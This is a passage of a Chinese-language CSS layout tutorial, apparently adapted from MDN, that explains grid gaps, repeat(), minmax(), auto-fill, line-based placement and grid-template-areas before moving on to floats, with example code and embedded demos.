可以同时设定两者。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">display</span>: grid;<br>    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">2</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;<br>    <span class="hljs-attribute">grid-gap</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>间隙距离可以用任何长度单位包括百分比来表示，但不能使用<code>fr</code>单位。</p><iframe class="sample-code-frame" title="网格间隙 sample" id="frame_网格间隙" width="100%" height="400" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Grids/_sample_.%E7%BD%91%E6%A0%BC%E9%97%B4%E9%9A%99.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p><strong>备注：</strong> <code>gap</code>属性曾经有一个<code>grid-</code>前缀，不过后来的标准进行了修改，目的是让他们能够在不同的布局方法中都能起作用。尽管现在这个前缀不会影响语义，但为了代码的健壮性，你可以把两个属性都写上。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">2</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;<br>  <span class="hljs-attribute">grid-gap</span>: <span class="hljs-number">20px</span>;<br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="重复构建轨道组"><a href="#重复构建轨道组" class="headerlink" title="重复构建轨道组"></a>重复构建轨道组</h4><p>你可以使用<code>repeat</code>来重复构建具有某些宽度配置的某些列。举个例子，如果要创建多个等宽轨道，可以用下面的方法。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>fr);<br>  <span class="hljs-attribute">grid-gap</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>和之前一样，你仍然得到了 3 个 <code>1fr</code> 的列。第一个传入 repeat 函数的值（<code>3</code>）表明了后续列宽的配置要重复多少次，而第二个值（<code>1fr</code>）表示需要重复的构建配置，这个配置可以具有多个长度设定。例如<code>repeat(2, 2fr 1fr)</code>，如果你仍然不明白，可以实际测试一下效果，这相当于填入了 <code>2fr 1fr 2fr 1fr</code>。</p><h4 id="显式网格与隐式网格"><a href="#显式网格与隐式网格" class="headerlink" title="显式网格与隐式网格"></a>显式网格与隐式网格</h4><p>到目前为止，我们定义过了列，但还没有管过行。但在这之前，我们要来理解一下显式网格和隐式网格。显式网格是我们用 <code>grid-template-columns</code> 或 <code>grid-template-rows</code> 属性创建的。而隐式网格则是当有内容被放到网格外时才会生成的。显式网格与隐式网格的关系与弹性盒子的 main 和 cross 轴的关系有些类似。</p><p>隐式网格中生成的行&#x2F;列大小是参数默认是 <code>auto</code> ，大小会根据放入的内容自动调整。当然，你也可以使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-auto-rows"><code>grid-auto-rows</code></a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-auto-columns"><code>grid-auto-columns</code></a>属性手动设定隐式网格轨道的大小。下面的例子将<code>grid-auto-rows</code>设为了<code>100px</code>，然后你可以看到那些隐式网格中的行（因为这个例子里没有设定<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-template-rows"><code>grid-template-rows</code></a>，因此，所有行都位于隐式网格内）现在都是 100 像素高了。</p><p>译者注：简单来说，隐式网格就是为了放显式网格放不下的元素，浏览器根据已经定义的显式网格自动生成的网格部分。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>fr);<br>  <span class="hljs-attribute">grid-auto-rows</span>: <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">grid-gap</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Copy to Clipboard</p><iframe class="sample-code-frame" title="显式网格与隐式网格 sample" id="frame_显式网格与隐式网格" width="100%" height="400" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Grids/_sample_.%E6%98%BE%E5%BC%8F%E7%BD%91%E6%A0%BC%E4%B8%8E%E9%9A%90%E5%BC%8F%E7%BD%91%E6%A0%BC.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem; color: rgb(27, 27, 27); font-family: Inter, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen, Ubuntu, Cantarell, &quot;Fira Sans&quot;, &quot;Droid Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"></iframe><h4 id="minmax-函数"><a href="#minmax-函数" class="headerlink" title="minmax() 函数"></a>minmax() 函数</h4><p>100 像素高的轨道有时可能会不够用，因为时常会有比 100 像素高的内容加进去。所以，我们可以将其设定为至少 100 像素，并且能够跟随内容来自动拓展尺寸，从而保证能容纳所有内容。显而易见，你很难知道网页上某个元素的尺寸在不同情况下会变成多少，一些额外的内容或者更大的字号就会导致许多能做到像素级精准的设计出现问题。所以，我们有了<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/minmax"><code>minmax</code></a>函数。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/minmax"><code>minmax</code></a> 函数为一个行&#x2F;列的尺寸设置了取值范围。比如设定为 <code>minmax(100px, auto)</code>，那么尺寸就至少为 100 像素，并且如果内容尺寸大于 100 像素则会根据内容自动调整。在这里试一下把 <code>grid-auto-rows</code> 属性设置为<code>minmax</code>函数。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>fr);<br>  <span class="hljs-attribute">grid-auto-rows</span>: <span class="hljs-built_in">minmax</span>(<span class="hljs-number">100px</span>, auto);<br>  <span class="hljs-attribute">grid-gap</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果所有网格内的内容均小于 100 像素，看起来不会有变化。但如果在某一项中放入很长的内容或者图片，你可以看到这个格子所在的哪一行的高度变成能刚好容纳内容的高度了。注意我们修改的是 <code>grid-auto-rows</code>，因此只会作用于隐式网格。当然，这一项属性也可以应用于显式网格，更多内容可以参考 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/minmax"><code>minmax</code></a> 页面。</p><h4 id="自动使用多列填充"><a href="#自动使用多列填充" class="headerlink" title="自动使用多列填充"></a>自动使用多列填充</h4><p>现在来试试把学到的关于网格的一切，包括 repeat 与 minmax 函数，组合起来，来实现一个非常有用的功能。某些情况下，我们需要让网格自动创建很多列来填满整个容器。通过设置<code>grid-template-columns</code>属性，我们可以实现这个效果，不过这一次我们会用到 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/repeat"><code>repeat</code></a> 函数中的一个关键字<code>auto-fill</code>来替代确定的重复次数。而函数的第二个参数，我们使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/minmax"><code>minmax</code></a>函数来设定一个行&#x2F;列的最小值，以及最大值 <code>1fr</code>。</p><p>在你的文件中试试看，你也许可以用到以下的代码。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">200px</span>, <span class="hljs-number">1</span>fr));<br>  <span class="hljs-attribute">grid-auto-rows</span>: <span class="hljs-built_in">minmax</span>(<span class="hljs-number">100px</span>, auto);<br>  <span class="hljs-attribute">grid-gap</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="自动使用多列填充 sample" id="frame_自动使用多列填充" width="100%" height="400" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Grids/_sample_.%E8%87%AA%E5%8A%A8%E4%BD%BF%E7%94%A8%E5%A4%9A%E5%88%97%E5%A1%AB%E5%85%85.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>你应该能看到形成了一个包含了许多至少 200 像素宽的列的网格，将容器填满。随着容器宽度的改变，网格会自动根据容器宽度进行调整，每一列的宽度总是大于 200 像素，并且容器总会被列填满。（This works because grid is creating as many 200 pixel columns as will fit into the container, then sharing whatever space is leftover between all of the columns — the maximum is 1fr which, as we already know, distributes space evenly between tracks.）</p><p>基于线的元素放置</p><p>在定义完了网格之后，我们要把元素放入网格中。我们的网格有许多分隔线，第一条线的起始点与文档书写模式相关。在英文中，第一条列分隔线（即网格边缘线）在网格的最左边而第一条行分隔线在网格的最上面。而对于阿拉伯语，第一条列分隔线在网格的最右边，因为阿拉伯文是从右往左书写的。</p><p>我们根据这些分隔线来放置元素，通过以下属性来指定从那条线开始到哪条线结束。</p><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/grid-column-start"><code>grid-column-start</code> (en-US)</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/grid-column-end"><code>grid-column-end</code> (en-US)</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/grid-row-start"><code>grid-row-start</code> (en-US)</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/grid-row-end"><code>grid-row-end</code> (en-US)</a></li></ul><p>这些属性的值均为分隔线序号，你也可以用以下缩写形式来同时指定开始与结束的线。</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-column"><code>grid-column</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-row"><code>grid-row</code></a></li></ul><p>注意开始与结束的线的序号要使用<code>/</code>符号分开。</p><p>下载<a href="https://github.com/mdn/learning-area/blob/master/css/css-layout/grids/8-placement-starting-point.html">这个文件</a>（或者查看<a href="https://mdn.github.io/learning-area/css/css-layout/grids/8-placement-starting-point.html">在线预览</a>）。文件中已经定义了一个网格以及一篇简单的文章位于网格之外。你可以看到元素已经被自动放置到了我们创建的网格中。</p><p>接下来，尝试用定义网格线的方法将所有元素放置到网格中。将以下规则加入到你的 css 的末尾：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">header</span> &#123;<br>  <span class="hljs-attribute">grid-column</span>: <span class="hljs-number">1</span> / <span class="hljs-number">3</span>;<br>  <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-selector-tag">article</span> &#123;<br>  <span class="hljs-attribute">grid-column</span>: <span class="hljs-number">2</span>;<br>  <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-selector-tag">aside</span> &#123;<br>  <span class="hljs-attribute">grid-column</span>: <span class="hljs-number">1</span>;<br>  <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-selector-tag">footer</span> &#123;<br>  <span class="hljs-attribute">grid-column</span>: <span class="hljs-number">1</span> / <span class="hljs-number">3</span>;<br>  <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">3</span>;<br>&#125;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="基于线的元素放置 sample" id="frame_基于线的元素放置" width="100%" height="400" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Grids/_sample_.%E5%9F%BA%E4%BA%8E%E7%BA%BF%E7%9A%84%E5%85%83%E7%B4%A0%E6%94%BE%E7%BD%AE.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p><strong>备注：</strong> 你也可以用 <code>-1</code> 来定位到最后一条列分隔线或是行分隔线，并且可以用负数来指定倒数的某一条分隔线。但是这只能用于显式网格，对于<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Grid">隐式网格</a><code>-1</code>不一定能定位到最后一条分隔线。</p><h4 id="使用-grid-template-areas-属性放置元素"><a href="#使用-grid-template-areas-属性放置元素" class="headerlink" title="使用 grid-template-areas 属性放置元素"></a>使用 grid-template-areas 属性放置元素</h4><p>另一种往网格放元素的方式是用<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/grid-template-areas"><code>grid-template-areas</code></a>属性，并且你要命名一些元素并在属性中使用这些名字作为一个区域。</p><p>将之前基于线的元素放置代码删除（或者重新下载一份新的文件），然后加入以下 CSS 规则：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-areas</span>:<br>    <span class="hljs-string">&quot;header header&quot;</span><br>    <span class="hljs-string">&quot;sidebar content&quot;</span><br>    <span class="hljs-string">&quot;footer footer&quot;</span>;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">3</span>fr;<br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>;<br>&#125;<br><br><span class="hljs-selector-tag">header</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: header;<br>&#125;<br><br><span class="hljs-selector-tag">article</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: content;<br>&#125;<br><br><span class="hljs-selector-tag">aside</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: sidebar;<br>&#125;<br><br><span class="hljs-selector-tag">footer</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: footer;<br>&#125;<br></code></pre></td></tr></table></figure><p>刷新页面，然后你应该能看到的元素会被放到与之前相同的地方，整个过程不需要我们指定任何分隔线序号。</p><iframe class="sample-code-frame" title="使用 grid-template-areas 属性放置元素 sample" id="frame_使用_grid-template-areas_属性放置元素" width="100%" height="400" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Grids/_sample_.%E4%BD%BF%E7%94%A8_grid-template-areas_%E5%B1%9E%E6%80%A7%E6%94%BE%E7%BD%AE%E5%85%83%E7%B4%A0.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p><code>grid-template-areas</code>属性的使用规则如下：</p><ul><li>你需要填满网格的每个格子</li><li>对于某个横跨多个格子的元素，重复写上那个元素<code>grid-area</code>属性定义的区域名字</li><li>所有名字只能出现在一个连续的区域，不能在不同的位置出现</li><li>一个连续的区域必须是一个矩形</li><li>使用<code>.</code>符号，让一个格子留空</li></ul><p>你可以在文件中尽情发挥你的想象来测试各种网格排版，比如把页脚放在内容之下，或者把侧边栏一直延伸到最底。这种直观的元素放置方式很棒，你在 CSS 中看到的就是实际会出现的排版效果。</p><h3 id="2-16-浮动"><a href="#2-16-浮动" class="headerlink" title="2.16 浮动"></a>2.16 浮动</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/float"><code>float</code></a> 属性最初只用于在成块的文本内浮动图像，但是现在它已成为在网页上创建多列布局的最常用工具之一。本文将阐述它的有关知识。</p><h4 id="浮动的背景知识"><a href="#浮动的背景知识" class="headerlink" title="浮动的背景知识"></a>浮动的背景知识</h4><p>最初，引入 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/float"><code>float</code></a> 属性是为了能让 Web 开发人员实现简单的布局，包括在一列文本中浮动的图像，文字环绕在它的左边或右边。你可能在报纸版面上看到过。</p><p>但 Web 开发人员很快意识到，任何东西都可以浮动，而不仅仅是图像，所以浮动的使用范围扩大了。之前的 <a href="https://css-tricks.com/snippets/css/drop-caps/">fancy paragraph example</a> 的课程展示了如何使用浮动创建一个有趣的 drop-cap（首字下沉）效果。</p><p>浮动曾被用来实现整个网站页面的布局，它使信息列得以横向排列（默认的设定则是按照这些列在源代码中出现的顺序纵向排列）。目前出现了更新更好的页面布局技术，所以使用浮动来进行页面布局应被看作<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Legacy_Layout_Methods">传统的布局方法</a>。</p><p>在这一章中，我们仅就浮动这一命令本身的性能展开讲解。</p><h4 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h4><p>让我们来探讨如何使用浮动。我们将从一个非常简单的例子开始，包括在图像周围浮动一个文本块。你可以在电脑上创建新的 <code>index.html</code> 文件，并以 <a href="https://github.com/mdn/learning-area/blob/master/html/introduction-to-html/getting-started/index.html">简单的 HTML 模板</a> 填充，在适当的地方插入以下代码。稍后你可以看到示例代码应该能呈现出的效果。</p><p>首先，我们写一些简单的 HTML——添加以下内容到 HTML 的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/body">&#96;&#96;</a>内，删除之前<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/body">&#96;&#96;</a>里面的东西：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Simple float example<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;box&quot;</span>&gt;</span>Float<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla luctus aliquam dolor, eu lacinia lorem placerat vulputate. Duis felis orci, pulvinar id metus ut, rutrum luctus orci. Cras porttitor imperdiet nunc, at ultricies tellus laoreet sit amet. <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Sed auctor cursus massa at porta. Integer ligula ipsum, tristique sit amet orci vel, viverra egestas ligula. Curabitur vehicula tellus neque, ac ornare ex malesuada et. In vitae convallis lacus. Aliquam erat volutpat. Suspendisse ac imperdiet turpis. Aenean finibus sollicitudin eros pharetra congue. Duis ornare egestas augue ut luctus. Proin blandit quam nec lacus varius commodo et a urna. Ut id ornare felis, eget fermentum sapien.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Nam vulputate diam nec tempor bibendum. Donec luctus augue eget malesuada ultrices. Phasellus turpis est, posuere sit amet dapibus ut, facilisis sed est. Nam id risus quis ante semper consectetur eget aliquam lorem. Vivamus tristique elit dolor, sed pretium metus suscipit vel. Mauris ultricies lectus sed lobortis finibus. Vivamus eu urna eget velit cursus viverra quis vestibulum sem. Aliquam tincidunt eget purus in interdum. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>现在将以下 CSS 应用到您的 HTML 中（使用 <code>&lt;style&gt;</code> 元素或 <code>&lt;link&gt;</code> 到单独的 .css 文件——由你选择）：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">90%</span>;<br>    <span class="hljs-attribute">max-width</span>: <span class="hljs-number">900px</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;<br>    <span class="hljs-attribute">font</span>: .<span class="hljs-number">9em</span>/<span class="hljs-number">1.2</span> Arial, Helvetica, sans-serif;<br>&#125;<br><br><span class="hljs-selector-class">.box</span> &#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">150px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgb</span>(<span class="hljs-number">207</span>,<span class="hljs-number">232</span>,<span class="hljs-number">220</span>);<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">1em</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果你现在保存并刷新，你会看到和你预期的效果差不多——图片坐落在文本的上方，且保持正常布局流。</p><h4 id="使盒子浮动起来"><a href="#使盒子浮动起来" class="headerlink" title="使盒子浮动起来"></a>使盒子浮动起来</h4><p>为了使盒子浮动起来，向规则 <code>.box</code> 下添加 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/float"><code>float</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/margin-right"><code>margin-right</code></a> 属性：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.box</span> &#123;<br>    <span class="hljs-attribute">float</span>: left;<br>    <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">15px</span>;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">150px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgb</span>(<span class="hljs-number">207</span>,<span class="hljs-number">232</span>,<span class="hljs-number">220</span>);<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">1em</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在，如果您保存和刷新，你会看到类似下面的东西：</p><iframe class="sample-code-frame" title="使盒子浮动起来 sample" id="frame_使盒子浮动起来" width="100%" height="500" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Floats/_sample_.%E4%BD%BF%E7%9B%92%E5%AD%90%E6%B5%AE%E5%8A%A8%E8%B5%B7%E6%9D%A5.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>让我们考虑一下浮动是如何工作的——浮动元素 (这个例子中的<code>&lt;div&gt;</code>元素) 会脱离正常的文档布局流，并吸附到其父容器的左边（这个例子中的<code>&lt;body&gt;</code>元素）。在正常布局中位于该浮动元素之下的内容，此时会围绕着浮动元素，填满其右侧的空间。</p><p>向右浮动的内容是一样的效果，只是反过来了——浮动元素会吸附到右边，而其他内容将从左侧环绕它。尝试将上一个例子中的浮动值改为 <code>right</code> ，再把 <code>margin-right</code> 换成 <code>margin-left</code> ，看看结果是什么。</p><h4 id="让浮动效果可视化"><a href="#让浮动效果可视化" class="headerlink" title="让浮动效果可视化"></a>让浮动效果可视化</h4><p>我们可以在浮动元素上应用 margin，将文字推开，但不能在文字上应用 margin 将浮动元素推走。这是因为浮动的元素脱离了正常文档流，紧随其后的元素排布在它的“后方”。你可以将示例代码进行更改，来观察到这个现象。</p><p>在紧随浮动盒子的第一段文字上添加 <code>special</code> 类，然后在你的 CSS 文件中添加如下规则，它会赋予跟随其后的段落一个背景色。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.special</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgb</span>(<span class="hljs-number">79</span>,<span class="hljs-number">185</span>,<span class="hljs-number">227</span>);<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>为了更清晰的看到效果，将浮动的 <code>margin-left</code> 改为 <code>margin</code> 以将周围全部空出来。如此代码效果所示，你可以看到段落的背景色处于浮动盒子之下。</p><iframe class="sample-code-frame" title="让浮动效果可视化 sample" id="frame_让浮动效果可视化" width="100%" height="500" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Floats/_sample_.%E8%AE%A9%E6%B5%AE%E5%8A%A8%E6%95%88%E6%9E%9C%E5%8F%AF%E8%A7%86%E5%8C%96.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem; color: rgb(27, 27, 27); font-family: Inter, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen, Ubuntu, Cantarell, &quot;Fira Sans&quot;, &quot;Droid Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"></iframe><p>目标元素的<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Visual_formatting_model#line_boxes">行内盒子</a>已被缩短，故文字会排布在浮动元素周围，但是浮动元素从正常文档流移出，故段落的盒子仍然保持全部宽度。</p><h4 id="清除浮动"><a href="#清除浮动" class="headerlink" 